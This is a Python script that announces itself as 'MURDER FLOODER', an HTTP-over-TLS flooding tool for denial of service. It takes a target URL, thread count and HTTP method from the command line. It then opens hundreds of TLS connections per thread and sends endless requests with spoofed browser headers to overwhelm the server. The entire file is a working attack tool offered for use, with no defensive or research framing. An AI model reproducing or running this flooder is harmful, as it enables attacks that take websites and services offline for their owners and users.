import socket,ssl,threading,struct,sys
from MODEL.data import get_target,generate_url_path

def Murder_flooding(s,r):
    stream = 255
    while True:
     try:
        s.sendall(r[0])
        s.sendall(r[1])
        if stream == 0:s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0)); stream = 255
        else:stream -= 1
     except:break
    s.shutdown(socket.SHUT_RDWR)
    s.close()

def Murder_connection(target,m):
    try:
      path = 1
      for _ in range(500):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
        a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
        a.options = ssl.OP_NO_RENEGOTIATION
        a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
        threading.Thread(target=Murder_flooding,args=(a.wrap_socket(s,server_hostname=target['host']),[f"{m} {a} HTTP/1.1\r\nHost: {target['host']}\r\nCache-Control: no-cache\r\npragma: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 PTST/190628.140653\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nTe: trailers\r\nConnection: Keep-Alive\r\n\r\n".encode() for a in [f'/{generate_url_path(path)}',target['uri']]])).start()
        path += 1
    except:pass

url = '';meth = ''; thread = 0

if len(sys.argv) == 4:
   url,thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
else:
 print(f'WELCOME TO MURDER FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
target = get_target(url)
for _ in range(thread):[threading.Thread(target=Murder_connection,args=(target,meth)).start() for x in range(10)]